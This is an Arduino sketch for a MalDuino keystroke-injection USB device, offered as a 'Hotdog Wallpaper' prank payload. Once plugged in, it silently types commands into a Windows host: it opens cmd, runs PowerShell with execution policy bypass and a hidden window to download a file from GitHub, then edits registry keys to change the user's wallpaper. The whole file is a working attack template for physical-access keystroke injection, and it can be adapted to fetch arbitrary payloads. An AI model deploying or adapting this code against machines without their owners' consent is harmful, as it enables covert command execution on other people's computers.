/*
  Hotdog Wallpaper Payload for ORIGINAL MALDUINO hw
  Copyright (c) 2021, Pauo C. Marcon (Licensed under MIT)
  For more information see: https://github.com/pcmarcon/malduino-payload-sample
*/

#include "Keyboard.h"
#include "Mouse.h"

#define blinkInterval 50
#define ledPin 3            // original malduino hw use ledpin 3
#define buttonPin 6

int defaultDelay = 4;
int defaultCharDelay = 5;
int rMin = 0;
int rMax = 100;
bool ledOn = true;

void typeKey(int key) {
  Keyboard.press(key);
  delay(defaultCharDelay);
  Keyboard.release(key);
}

void setup() {
  pinMode(buttonPin, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  delay(1000);
  digitalWrite(ledPin, LOW);
  delay(1000);
  digitalWrite(ledPin, HIGH);
  delay(1000);
  digitalWrite(ledPin, LOW);
  delay(1000);
  digitalWrite(ledPin, HIGH);

  if (digitalRead(buttonPin) == LOW) {
    Keyboard.begin();
    Mouse.begin();

    /* ----- Begin-Payload -----*/
    delay(1000);            // extra 1s delay, can be adjusted if needed
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(114);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print("cmd");
    typeKey(KEY_RETURN);
    delay(1000);
    Keyboard.print("cd %temp%");
    typeKey(KEY_RETURN);
    delay(100);
    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/hotdog.bmp', 'hotdog.bmp')\"");
    delay(100);
    typeKey(KEY_RETURN);
    delay(3000);
    Keyboard.print("reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"\" /f");
    delay(100);
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print("reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v wallpaper /t REG_SZ /d %temp%\\hotdog.bmp /f");
    delay(100);
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print("reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v WallpaperStyle /t REG_SZ /d 2 /f");
    delay(100);
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print("FOR /L %i IN (1,1,50) DO (RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters)");
    delay(100);
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print("exit");
    delay(100);
    typeKey(KEY_RETURN);
    /* ----- End-Payload -----*/

    Keyboard.end();
  }
}

void loop() {
  ledOn = !ledOn;
  digitalWrite(ledPin, ledOn);
  delay(blinkInterval);
}
